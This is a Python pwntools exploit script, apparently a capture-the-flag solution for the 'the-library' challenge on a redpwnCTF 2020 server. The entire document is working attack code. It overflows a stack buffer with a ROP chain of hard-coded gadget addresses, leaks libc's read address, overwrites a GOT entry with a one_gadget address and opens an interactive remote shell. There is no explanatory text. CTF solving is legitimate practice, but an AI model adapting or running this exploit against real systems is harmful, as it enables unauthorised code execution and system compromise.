#! /usr/bin/env python
from pwn import *

#e = ELF('/lib/x86_64-linux-gnu/libc.so.6');
e = ELF('./libc.so.6')
target_addr = 0x4f322 #e.symbols["system"] 
offset = target_addr - e.symbols['read'] 

print(hex(offset))

context(log_level ="debug")
#p = process("./the-library")
p = remote("2020.redpwnc.tf" , 31350 ) 
#gdb.attach(p)
p.recvuntil('?\n')
rbp_addr = p64(0x601028)
main_puts_addr = p64(0x400682)
pop1_addr = p64(0x4005b8);
pop_edi_addr = p64(0x400733)
pop3_addr = p64(0x40072f);
read_addr = p64(0x40068b);

payload = b'a' * 16 + rbp_addr +pop_edi_addr  + rbp_addr + main_puts_addr
p.send(payload)
p.recvuntil('\n')
p.recvuntil('\n')
read_addr =int.from_bytes(p.recv(6),"little" )
payload2 = p64(read_addr + offset) + b'\n'
p.send(payload2)
p.interactive()

